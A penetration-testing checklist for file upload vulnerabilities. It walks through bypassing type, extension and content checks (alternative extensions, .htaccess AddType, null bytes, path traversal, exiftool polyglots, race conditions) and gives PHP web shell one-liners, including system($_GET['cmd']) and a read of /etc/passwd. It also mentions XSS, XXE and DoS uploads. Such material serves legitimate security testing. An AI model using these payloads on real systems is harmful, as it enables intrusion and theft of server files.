# File Upload Testing Checklist

## Recon

1. **Is there a file upload feature?**
   - Check profile pages, settings, support tickets, document uploads, import features
   - Try PUT method on various endpoints (send OPTIONS request first)

2. **What happens when you upload a normal image?**
   - Where does it get stored? (check response, page source, Burp history)
   - Can you access it directly via URL?
   - What's the full path? (e.g. /files/avatars/image.jpg)

3. **What happens when you upload a .php file?**
   - Accepted? You have RCE, go to [Exploit](#exploit)
   - Rejected? What does the error say? Go to [Bypass](#bypass---based-on-what-the-server-checks)

## Bypass - based on what the server checks

**Does the error mention file type / content type?**

Server checks the Content-Type header in the multipart body.
- Change Content-Type to `image/jpeg` or `image/png` in Burp
- Keep filename as `shell.php`

**Does the error mention file extension?**

Server has an extension blacklist or whitelist.

Blacklist? Try:
- Alternative extensions: `.php5`, `.phtml`, `.phar`, `.phps`
- Upload `.htaccess` to register a custom extension as PHP (Apache)
  ```
  AddType application/x-httpd-php .lol
  ```
- Upload `web.config` to do the same on IIS

Whitelist? Try:
- Null byte: `shell.php%00.jpg`
- Double extension: `shell.php.jpg`
- Case variation: `shell.pHp`
- Trailing dot/space: `shell.php.`

**File uploads but doesn't execute?**

Upload directory has execution disabled.
- Try path traversal in filename: `../shell.php`
- If `../` gets stripped, try URL-encoded: `..%2fshell.php`

**Error says file content doesn't match an image?**

Server inspects magic bytes / file content.
- Create a polyglot:
  ```bash
  exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
  mv image.jpg shell.php
  ```
- The file is a valid JPEG that also contains executable PHP

**File uploads, passes validation, but gets deleted quickly?**

Server validates after writing to disk (race condition).
- Use Turbo Intruder or threading to fetch the file before deletion
- Send upload and fetch requests simultaneously using the gate mechanism
- May need multiple attempts to catch the window

## Exploit

Once you have a shell uploaded and executing:
- Read files: `<?php echo file_get_contents('/etc/passwd'); ?>`
- Run commands: `<?php system($_GET['cmd']); ?>`
- Reverse shell: use pentest cheatsheets for your target OS

## No RCE? Other attacks

- Upload HTML/SVG with `<script>` tags for stored XSS
- Upload XML-based files (.docx, .svg) with XXE payloads
- Upload oversized files for DoS
